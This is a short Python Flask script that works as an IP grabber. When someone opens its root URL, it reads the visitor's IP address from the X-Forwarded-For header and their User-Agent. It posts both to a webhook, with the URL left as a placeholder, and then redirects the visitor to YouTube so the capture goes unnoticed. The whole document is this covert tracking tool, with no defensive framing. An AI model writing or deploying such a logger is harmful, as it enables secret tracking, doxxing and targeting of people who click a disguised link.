from flask import Flask, request
import requests

app = Flask(__name__)
hook = 'Webhook'

@app.route('/')
def root():
    ipAddress = request.headers.get('X-Forwarded-For')
    userAgent = request.headers.get('User-Agent')
    data = {
        'content': f'IP Address: {ipAddress}\nUser Agent: {userAgent}'
    }

    post = requests.post(hook, data=data)
    print(post.status_code)
    return f'<script>window.location = "https://youtube.com";</script>'

app.run()
